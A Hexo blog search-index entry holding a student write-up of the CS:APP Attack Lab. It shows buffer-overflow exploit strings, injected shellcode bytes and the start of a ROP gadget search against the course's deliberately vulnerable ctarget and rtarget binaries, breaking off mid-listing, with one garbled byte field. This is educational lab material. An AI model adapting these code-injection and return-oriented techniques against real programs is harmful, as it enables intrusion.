<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Attack Lab Report</title>
    <url>/2023/01/19/attack-lab/</url>
    <content><![CDATA[<h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><ul>
<li>learn different ways that attackers can exploit security vulnerabilities when programs do not safeguard themselves well enough against buffer overflows</li>
<li>get a better understanding of how to write programs that are more secure, as well as some of the features provided by compilers and operating systems to make programs less vulnerable</li>
<li>gain a deeper understanding of the stack and parameter-passing mechanisms of x86-64 machine code</li>
<li>gain a deeper understanding of how x86-64 instructions are encoded</li>
<li>gain more experience with debugging tools such as GDB and OBJDUMP</li>
</ul>
<h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h4 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h4><p>​		Functions Gets() and gets() have no way to determine whether their destination buffers are large enough to store the string they read. They simply copy sequences of bytes, possibly overrunning the bounds of the storage allocated at the destinations. So we can feed CTARGET and RTARGET so that they do more interesting things. These are called <em>exploit</em> strings.</p>
<h3 id="Code-Injection-Attacks："><a href="#Code-Injection-Attacks：" class="headerlink" title="Code Injection Attacks："></a>Code Injection Attacks：</h3><h4 id="实验原理：-1"><a href="#实验原理：-1" class="headerlink" title="实验原理："></a>实验原理：</h4><p>​		This program CTARGET is set up in a way that the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.</p>
<h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1:"></a>Level 1:</h4><ul>
<li><p>观察所给出的代码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = <span class="built_in">getbuf</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">	<span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可知只需触发 touch1 即可通过</p>
</li>
<li><p>将 ctarget 反汇编：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.txt</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>观察 getbuf 的反汇编：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401c23 &lt;getbuf&gt;:</span><br><span class="line">  401c23:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401c27:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  401c2b:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401c2e:	e8 b5 02 00 00       	callq  401ee8 &lt;Gets&gt;</span><br><span class="line">  401c33:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401c38:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  401c3c:	c3                   	retq   </span><br></pre></td></tr></table></figure></div>

<p>可知 getbuf 的开辟了 0x38 字节栈空间</p>
<p>由于 getbuf 并不会判断缓冲区的溢出，因而可以输入通过超长的字符串，在填充满缓冲区后将返回地址用 touch1 的首地址覆盖</p>
</li>
<li><p>观察 touch1 的反汇编：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401c3d &lt;touch1&gt;:</span><br><span class="line">  401c3d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401c41:	50                   	push   %rax</span><br><span class="line">  401c42:	58                   	pop    %rax</span><br><span class="line">  401c43:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401c47:	c7 05 ab 58 00 00 01 	movl   $0x1,0x58ab(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  401c4e:	00 00 00 </span><br><span class="line">  401c51:	48 8d 3d a9 26 00 00 	lea    0x26a9(%rip),%rdi        # 404301 &lt;_IO_stdin_used+0x301&gt;</span><br><span class="line">  401c58:	e8 23 f4 ff ff       	callq  401080 &lt;puts@plt&gt;</span><br><span class="line">  401c5d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401c62:	e8 f4 04 00 00       	callq  40215b &lt;validate&gt;</span><br><span class="line">  401c67:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401c6c:	e8 6f f5 ff ff       	callq  4011e0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></div>

<p>得到 touch1 的首地址为 0x401c3d，将其写成小端法，覆盖返回地址</p>
</li>
<li><p>最终填入字符串如下：（# 后的为注释）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">3d 1c 40 00 00 00 00 00 # touch1 的首地址</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>用栈的分配图示意：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/attack-lab.assets/stack1.png"
                      alt="stack1"
                ></p>
</li>
</ul>
<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2:"></a>Level 2:</h4><ul>
<li><p>观察所给出代码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可知需要触发 touch2 且同时将 cookie 作为 unsigned 类型的参数传入，方可通过。</p>
</li>
<li><p>观察 touch2 的反汇编：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401c71 &lt;touch2&gt;:</span><br><span class="line">  401c71:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401c75:	50                   	push   %rax</span><br><span class="line">  401c76:	58                   	pop    %rax</span><br><span class="line">  401c77:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401c7b:	89 fa                	mov    %edi,%edx</span><br><span class="line">  401c7d:	c7 05 75 58 00 00 02 	movl   $0x2,0x5875(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  401c84:	00 00 00 </span><br><span class="line">  401c87:	39 3d 77 58 00 00    	cmp    %edi,0x5877(%rip)        # 407504 &lt;cookie&gt;</span><br><span class="line">  401c8d:	74 2a                	je     401cb9 &lt;touch2+0x48&gt;</span><br><span class="line">  401c8f:	48 8d 35 ba 26 00 00 	lea    0x26ba(%rip),%rsi        # 404350 &lt;_IO_stdin_used+0x350&gt;</span><br><span class="line">  401c96:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401c9b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401ca0:	e8 eb f4 ff ff       	callq  401190 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401ca5:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  401caa:	e8 80 05 00 00       	callq  40222f &lt;fail&gt;</span><br><span class="line">  401caf:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401cb4:	e8 27 f5 ff ff       	callq  4011e0 &lt;exit@plt&gt;</span><br><span class="line">  401cb9:	48 8d 35 68 26 00 00 	lea    0x2668(%rip),%rsi        # 404328 &lt;_IO_stdin_used+0x328&gt;</span><br><span class="line">  401cc0:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401cc5:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401cca:	e8 c1 f4 ff ff       	callq  401190 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401ccf:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  401cd4:	e8 82 04 00 00       	callq  40215b &lt;validate&gt;</span><br><span class="line">  401cd9:	eb d4                	jmp    401caf &lt;touch2+0x3e&gt;</span><br></pre></td></tr></table></figure></div>

<p>可得到 touch2 的首地址为 0x401c71</p>
</li>
<li><p>通过注入一段代码将 cookie 存入 %rdi 中，以作为第一个参数传入 touch2，并随后返回 touch2</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq    $0x23d99ec8, %rdi</span><br><span class="line">pushq   $0x401c71</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过 gcc 将其编译再反汇编，得到机器码</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c ci2.s</span><br><span class="line">objdump -d ci2.o &gt; ci2.txt</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf c8 9e d9 23</span><br><span class="line">68 71 1c 40 00</span><br><span class="line">c3 </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>借助 gdb 获取读入字符时的 %rsp</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line">(gdb) <span class="built_in">break</span> *0x401c2b</span><br><span class="line">(gdb) run -q</span><br><span class="line">(gdb) p <span class="variable">$rsp</span></span><br></pre></td></tr></table></figure></div>

<p>得到 %rsp 的值为 0x556335f8</p>
</li>
<li><p>最终填入字符串如下：（# 后的为注释）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf c8 9e d9 23 68 71 1c</span><br><span class="line">40 00 c3 00 00 00 00 00 # 注入代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">f8 35 63 55 00 00 00 00 # 注入代码的地址</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>栈的分配示意图如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/attack-lab.assets/stack2.png"
                      alt="stack2"
                ></p>
</li>
</ul>
<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3:"></a>Level 3:</h4><ul>
<li><p>观察所给出代码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可知需要触发 touch3 且同时将 cookie 作为 char[] 类型的参数传入，方可通过</p>
</li>
<li><p>将 cookie 转为16进制的 ascii 码表示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">32 33 64 39 39 65 63 38 00 # 由于是字符串，结尾需要用 &#x27;\0&#x27; 标记</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>注意由于 hexmatch 和 strncmp 都会申请栈空间，因此若字符串存在 getbuf 的栈帧内有一定概率被覆盖。为保险起见，将字符串存于返回地址之后。通过读入字符时 %rsp 的值和注入字符的长度，可以计算出字符串首地址为 0x55633638。</p>
<p>与 level 2 类似地，可以得到注入代码的机器码，作用为将字符串首地址传入 %rdi，并使其作为第一个参数传入并调用 touch2：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf 38 36 63 55</span><br><span class="line">68 96 1d 40 00</span><br><span class="line">c3</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>最终填入字符串如下：（# 后的为注释）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf 38 36 63 55 68 96 1d</span><br><span class="line">40 00 c3 00 00 00 00 00 # 注入代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">f8 35 63 55 00 00 00 00 # 注入代码的地址</span><br><span class="line">32 33 64 39 39 65 63 38 </span><br><span class="line">00						# cookie 的字符串形式</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>栈的分配示意图如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/attack-lab.assets/stack3.png"
                      alt="stack3"
                ></p>
</li>
</ul>
<h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming:"></a>Return-Oriented Programming:</h3><h4 id="实验原理：-2"><a href="#实验原理：-2" class="headerlink" title="实验原理："></a>实验原理：</h4><p>​		We get useful things done in a program by executing existing code, rather than injecting new code. The most general form of this is referred to as <em>return-oriented programming</em> (ROP) [1, 2]. The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret. Such a segment is referred to as a <em>gadget</em>.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/attack-lab.assets/gadget.png"
                      alt="gadget"
                ></p>
<h4 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2:"></a>Level 2:</h4><ul>
<li><p>再次观察所给出代码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可知需要触发 touch2 且同时将 cookie 作为 unsigned 类型的参数传入，方可通过。</p>
</li>
<li><p>将 rtarget 反汇编：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.txt</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>观察其中的 gadgets，根据需求寻找合适代码段</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401e3b &lt;start_farm&gt;:</span><br><span class="line">  401e3b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e3f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401e44:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e45 &lt;getval_349&gt;:</span><br><span class="line">  401e45:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e49:	b8 48 89 c7 c7       	mov    $0xc7c78948,%eax</span><br><span class="line">  401e4e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e4f &lt;setval_341&gt;:</span><br><span class="line">  401e4f:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e53:	c7 07 d8 90 90 c3    	movl   $0xc39090d8,(%rdi)</span><br><span class="line">  401e59:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e5a &lt;getval_262&gt;:</span><br><span class="line">  401e5a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e5e:	b8 58 90 c3 9a       	mov    $0x9ac39058,%eax</span><br><span class="line">  401e63:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e64 &lt;getval_167&gt;:</span><br><span class="line">  401e64:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e68:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax</span><br><span class="line">  401e6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e6e &lt;addval_458&gt;:</span><br><span class="line">  401e6e:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e72:	8d 87 4a 89 c7 90    	lea    -0x6f3876b6(%rdi),%eax</span><br><span class="line">  401e78:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e79 &lt;getval_435&gt;:</span><br><span class="line">  401e79:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e7d:	b8 58 90 90 c3       	mov    $0xc3909058,%eax</span><br><span class="line">  401e82:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e83 &lt;getval_455&gt;:</span><br><span class="line">  401e83:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e87:	b8 58 90 c1 b6       	mov    $0xb6c19058,%eax</span><br><span class="line">  401e8c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e8d &lt;setval_232&gt;:</span><br><span class="line">  401e8d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e91:	c7 07 cb 48 89 c7    	movl   $0xc78948cb,(%rdi)</span><br><span class="line">  401e97:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e98 &lt;mid_farm&gt;:</span><br><span class="line">  401e98:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e9c:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ea1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ea2 &lt;add_xy&gt;:</span><br><span class="line">  401ea2:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ea6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  401eaa:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401eab &lt;setval_424&gt;:</span><br><span class="line">  401eab:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eaf:	c7 07 8b d1 38 db    	movl   $0xdb38d18b,(%rdi)</span><br><span class="line">  401eb5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401eb6 &lt;setval_260&gt;:</span><br><span class="line">  401eb6:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eba:	c7 07 81 ce 84 db    	movl   $0xdb84ce81,(%rdi)</span><br><span class="line">  401ec0:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ec1 &lt;getval_202&gt;:</span><br><span class="line">  401ec1:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ec5:	b8 81 c2 84 c0       	mov    $0xc084c281,%eax</span><br><span class="line">  401eca:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ecb &lt;getval_125&gt;:</span><br><span class="line">  401ecb:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ecf:	b8 f0 48 81 e0       	mov    $0xe08148f0,%eax</span><br><span class="line">  401ed4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ed5 &lt;addval_475&gt;:</span><br><span class="line">  401ed5:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ed9:	8d 87 48 81 e0 c3    	lea    -0x3c1f7eb8(%rdi),%eax</span><br><span class="line">  401edf:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ee0 &lt;setval_432&gt;:</span><br><span class="line">  401ee0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ee4:	c7 07 88 c2 08 db    	movl   $0xdb08c288,(%rdi)</span><br><span class="line">  401eea:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401eeb &lt;setval_429&gt;:</span><br><span class="line">  401eeb:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eef:	c7 07 x c3    	movl   $0xc3e08948,(%rdi)</span><br><span class="line">  401ef5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ef6 &lt;setval_165&gt;:</span><br><span class="line">  401ef6:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401efa:	c7 07 48 89 e0 94    	movl   $0x94e08948,(%rdi)</span><br><span class="line">  401f00:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f01 &lt;addval_238&gt;:</span><br><span class="line">  401f01:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f05:	8d 87 89 ce 48 d2    	lea    -0x2db73177(%rdi),%eax</span><br><span class="line">  401f0b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f0c &lt;setval_195&gt;:</span><br><span class="line">  401f0c:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f10:	c7 07 89 c2 30 d2    	movl   $0xd230c289,(%rdi)</span><br><span class="line">  401f16:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f17 &lt;addval_156&gt;:</span><br><span class="line">  401f17:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f1b:	8d 87 89 ce 91 c3    	lea    -0x3c6e3177(%rdi),%eax</span><br><span class="line">  401f21:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f22 &lt;setval_263&gt;:</span><br><span class="line">  401f22:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f26:	c7 07 c9 d1 84 db    	movl   $0xdb84d1c9,(%rdi)</span><br><span class="line">  401f2c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f2d &lt;getval_218&gt;:</span><br><span class="line">  401f2d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f31:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax</span><br><span class="line">  401f36:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f37 &lt;setval_305&gt;:</span><br><span class="line">  401f37:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f3b:	c7 07 88 c2 90 90    	movl   $0x9090c288,(%rdi)</span><br><span class="line">  401f41:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f42 &lt;addval_467&gt;:</span><br><span class="line">  401f42:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f46:	8d 87 48 99 e0 c3    	lea    -0x3c1f66b8(%rdi),%eax</span><br><span class="line">  401f4c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f4d &lt;setval_422&gt;:</span><br><span class="line">  401f4d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f51:	c7 07 df 81 c2 c3    	movl   $0xc3c281df,(%rdi)</span><br><span class="line">  401f57:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f58 &lt;getval_237&gt;:</span><br><span class="line">  401f58:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f5c:	b8 89 ce 08 c0       	mov    $0xc008ce89,%eax</span><br><span class="line">  401f61:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f62 &lt;addval_340&gt;:</span><br><span class="line">  401f62:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f66:	8d 87 48 88 e0 c3    	lea    -0x3c1f77b8(%rdi),%eax</span><br><span class="line">  401f6c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f6d &lt;addval_394&gt;:</span><br><span class="line">  401f6d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f71:	8d 87 89 c2 38 db    	lea    -0x24c73d77(%rdi),%eax</span><br><span class="line">  401f77:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f78 &lt;getval_388&gt;:</span><br><span class="line">  401f78:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f7c:	b8 89 ce 18 db       	mov    $0xdb18ce89,%eax</span><br><span class="line">  401f81:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f82 &lt;setval_368&gt;:</span><br><span class="line">  401f82:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f86:	c7 07 89 c2 84 db    	movl   $0xdb84c289,(%rdi)</span><br><span class="line">  401f8c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f8d &lt;setval_131&gt;:</span><br><span class="line">  401f8d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f91:	c7 07 89 d1 90 c3    	movl   $0xc390d189,(%rdi)</span><br><span class="line">  401f97:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f98 &lt;addval_250&gt;:</span><br><span class="line">  401f98:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f9c:	8d 87 99 ce 84 c9    	lea    -0x367b3167(%rdi),%eax</span><br><span class="line">  401fa2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fa3 &lt;getval_363&gt;:</span><br><span class="line">  401fa3:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fa7:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401fac:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fad &lt;addval_442&gt;:</span><br><span class="line">  401fad:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fb1:	8d 87 89 d1 48 c0    	lea    -0x3fb72e77(%rdi),%eax</span><br><span class="line">  401fb7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fb8 &lt;getval_313&gt;:</span><br><span class="line">  401fb8:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fbc:	b8 48 89 e0 90       	mov    $0x90e08948,%eax</span><br><span class="line">  401fc1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fc2 &lt;getval_244&gt;:</span><br><span class="line">  401fc2:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fc6:	b8 17 38 8b d1       	mov    